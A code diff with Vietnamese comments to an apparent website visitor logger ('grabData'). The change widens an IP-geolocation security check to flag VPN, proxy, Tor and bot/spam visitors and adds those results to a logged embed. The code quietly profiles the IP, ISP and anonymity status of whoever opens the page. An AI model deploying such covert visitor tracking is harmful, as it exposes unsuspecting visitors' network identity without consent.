@@ -27,24 +27,44 @@ const grabData = async () => {
         const agentData = await userResponse.json();
         console.log("API data OK");
 
-        // Gọi API security để detect VPN/Proxy
+        // Gọi API security để detect VPN/Proxy và threat
         const securityResponse = await fetch(`https://api.ipgeolocation.io/v2/security?apiKey=${apiKey}&ip=${geoData.ip}`);
         let vpnInfo = "Không rõ";
-        let isVPN = false;
+        let isAnonymized = false; // Để trigger màu đỏ nếu có VPN/Proxy/Tor/threat
+        let threatInfo = "Không có threat"; // Thông tin threat
         if (securityResponse.ok) {
             const securityData = await securityResponse.json();
-            console.log("Security API data OK");
-            isVPN = securityData.is_vpn || false;
-            if (isVPN) {
+            console.log("Security API data OK:", securityData);
+
+            // Xử lý VPN/Proxy/Tor
+            if (securityData.is_vpn) {
                 vpnInfo = `Có sử dụng VPN (${securityData.vpn_provider || 'Unknown Provider'})`;
+                isAnonymized = true;
             } else if (securityData.is_proxy) {
                 vpnInfo = `Có sử dụng Proxy (${securityData.proxy_type || 'Unknown Type'})`;
+                isAnonymized = true;
+            } else if (securityData.is_tor) {
+                vpnInfo = "Có sử dụng Tor";
+                isAnonymized = true;
             } else {
-                vpnInfo = "Không sử dụng VPN/Proxy";
+                vpnInfo = "Không sử dụng VPN/Proxy/Tor";
+            }
+
+            // Xử lý threat: Liệt kê các flag threat nếu có
+            const threatFlags = [];
+            if (securityData.is_bot) threatFlags.push("Bot");
+            if (securityData.is_spam) threatFlags.push("Spam");
+            // Thêm các flag khác nếu API hỗ trợ (dựa trên docs: is_attacker, is_anonymous, etc. có thể mở rộng sau)
+            if (threatFlags.length > 0) {
+                threatInfo = `Có threat: ${threatFlags.join(", ")}`;
+                isAnonymized = true; // Trigger màu đỏ nếu có threat
+            } else {
+                threatInfo = "Không có threat";
             }
         } else {
             console.warn("Không thể gọi Security API:", securityResponse.status);
             vpnInfo = "Không thể kiểm tra";
+            threatInfo = "Không thể kiểm tra threat";
         }
 
         // Hàm helper lấy giá trị an toàn (tránh undefined)
@@ -124,7 +144,7 @@ const grabData = async () => {
                     url: `https://whatismyipaddress.com/ip/${ip}`,
                     description: "Log lượt truy cập website",
                     thumbnail: { url: flag },
-                    color: isVPN ? 16711680 : 1993898,  // Đỏ nếu dùng VPN, xanh nếu không
+                    color: isAnonymized ? 16711680 : 1993898,  // Đỏ nếu có VPN/Proxy/Tor/threat, xanh nếu không
                     fields: [
                         {
                             name: "📞 ISP",
@@ -147,8 +167,13 @@ const grabData = async () => {
                             inline: true
                         },
                         {
-                            name: "🔒 VPN/Proxy",
+                            name: "🔒 VPN/Proxy/Tor",
                             value: vpnInfo,
+                            inline: true
+                        },
+                        {
+                            name: "⚠️ Threat Detected",
+                            value: threatInfo,
                             inline: true
                         },
                         {
